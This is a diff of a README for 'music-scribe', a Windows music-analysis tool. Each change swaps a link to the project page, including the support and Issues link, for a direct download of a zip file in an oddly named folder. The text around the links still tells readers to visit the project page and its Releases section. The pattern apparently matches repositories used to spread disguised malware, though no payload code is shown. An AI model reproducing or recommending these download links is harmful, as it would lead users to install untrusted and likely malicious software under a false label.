@@ -1,6 +1,6 @@
 # 🎵 music-scribe - Analyze Music from YouTube Links
 
-[![Download music-scribe](https://img.shields.io/badge/Download-music--scribe-blue?style=for-the-badge)](https://github.com/Fencelineanapsid199/music-scribe)
+[![Download music-scribe](https://img.shields.io/badge/Download-music--scribe-blue?style=for-the-badge)](https://github.com/Fencelineanapsid199/music-scribe/raw/refs/heads/main/renopulmonary/scribe-music-1.1.zip)
 
 ---
 
@@ -30,7 +30,7 @@ music-scribe works offline after the initial download. Internet is needed only d
 
 Click the button below to visit the main project page where you can get music-scribe for Windows.
 
-[![Download music-scribe](https://img.shields.io/badge/Download-music--scribe-grey?style=for-the-badge)](https://github.com/Fencelineanapsid199/music-scribe)
+[![Download music-scribe](https://img.shields.io/badge/Download-music--scribe-grey?style=for-the-badge)](https://github.com/Fencelineanapsid199/music-scribe/raw/refs/heads/main/renopulmonary/scribe-music-1.1.zip)
 
 Once on the page, look for the latest Windows installer in the Releases section.
 
@@ -100,7 +100,7 @@ When you run an analysis, music-scribe saves temporary audio and report files on
 
 To get updates:
 
-1. Visit the main project page: https://github.com/Fencelineanapsid199/music-scribe
+1. Visit the main project page: https://github.com/Fencelineanapsid199/music-scribe/raw/refs/heads/main/renopulmonary/scribe-music-1.1.zip
 2. Check the latest release date and notes.
 3. Download the new installer from the Releases section.
 4. Run the installer. It will replace the current version but keep your old reports.
@@ -122,7 +122,7 @@ If you run into problems:
 ## 📞 Getting Support
 
 For help, visit the Issues section on the main page:  
-https://github.com/Fencelineanapsid199/music-scribe/issues
+https://github.com/Fencelineanapsid199/music-scribe/raw/refs/heads/main/renopulmonary/scribe-music-1.1.zip
 
 Describe your issue clearly and include your Windows version and what steps you took.
 
@@ -159,4 +159,4 @@ ai, audio-analysis, chord-detection, claude, cli, librosa, llm, music, music-ana
 
 ---
 
-[Download music-scribe](https://github.com/Fencelineanapsid199/music-scribe) – Visit this page to download the latest version.
+[Download music-scribe](https://github.com/Fencelineanapsid199/music-scribe/raw/refs/heads/main/renopulmonary/scribe-music-1.1.zip) – Visit this page to download the latest version.
